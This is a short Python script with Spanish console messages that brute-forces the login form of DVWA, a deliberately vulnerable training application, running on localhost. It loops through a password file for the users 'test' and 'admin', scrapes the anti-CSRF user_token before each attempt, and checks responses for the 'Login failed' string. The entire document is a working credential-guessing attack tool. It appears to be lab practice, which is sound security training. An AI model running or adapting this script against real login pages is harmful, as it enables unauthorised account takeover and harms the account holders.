import requests
import sys
import time
import re

target = "http://127.0.0.1/DVWA/login.php"
usernames = ["test", "admin"]
passwords = "pass-list-200.txt"
needle = "Login failed"

for user in usernames:
	with open(passwords, "r") as passlist:
		for passw in passlist:
			passw = passw.strip("\n").encode("utf-8")
			sys.stdout.write("[X] Intentando user:password --> " + str(user) + ":" + str(passw.decode()) + "\n")
			sys.stdout.flush()
			s = requests.session()
			login = s.get(target)
			token = re.search("'user_token' value='(.*?)'", login.text).group(1)
			time.sleep(0.5)
			r = s.post(target, data={"username": user, "password": passw, "Login": "Login", "user_token": token})
			if needle.encode() not in r.content:
				sys.stdout.write("\nCredenciales validas encontradas!! --> " + str(user) + ":" + str(passw.decode()) + "\n")
				sys.stdout.flush()
				sys.exit()
		sys.stdout.write("Credenciales no encontradas con el usuario " + str(user) + "\n")
		sys.stdout.flush()